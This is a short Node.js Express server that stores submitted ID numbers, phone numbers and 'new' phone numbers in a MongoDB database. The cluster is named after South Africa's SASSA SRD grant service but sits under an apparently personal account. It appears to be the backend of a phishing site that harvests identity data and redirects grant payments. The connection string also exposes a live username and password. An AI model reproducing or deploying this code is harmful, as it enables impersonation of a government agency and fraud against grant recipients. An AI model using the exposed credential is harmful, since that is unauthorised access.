
const express = require('express');
const cors = require('cors');
const { MongoClient } = require('mongodb');

const app = express();
app.use(cors());
app.use(express.json());

const uri = 'mongodb+srv://mkasigiven09:yGiI6nmIj33vDrhk@srd-sassa-gov-za.qnutzho.mongodb.net/sassa?retryWrites=true&w=majority';
const client = new MongoClient(uri, {
  useNewUrlParser: true,
  useUnifiedTopology: true,
});
let collection;

async function startServer() {
  try {
    await client.connect();
    const db = client.db('sassa');
    collection = db.collection('srd');

    app.post('/submit', async (req, res) => {
      const { idNumber, phoneNumber, newphoneNumber } = req.body;

      console.log("📥 Received submission:", { idNumber, phoneNumber, newphoneNumber });

      try {
        const exists = await collection.findOne({ idNumber, phoneNumber });
        console.log("🔍 Checking for duplicate:", exists);

        if (exists) {
          console.log("⚠️ Duplicate found, skipping.");
          return res.status(409).send('Duplicate application');
        }

        const insertResult = await collection.insertOne({
          idNumber,
          phoneNumber,
          newphoneNumber,
          timestamp: new Date()
        });

        console.log("✅ Inserted into DB:", insertResult.insertedId);
        res.status(200).send('Application submitted');
      } catch (err) {
        console.error("❌ DB Error:", err);
        res.status(500).send('Server error');
      }
    });

    const PORT = process.env.PORT || 3000;
    app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
  } catch (err) {
    console.error('❌ Failed to connect to DB:', err);
  }
}

startServer();
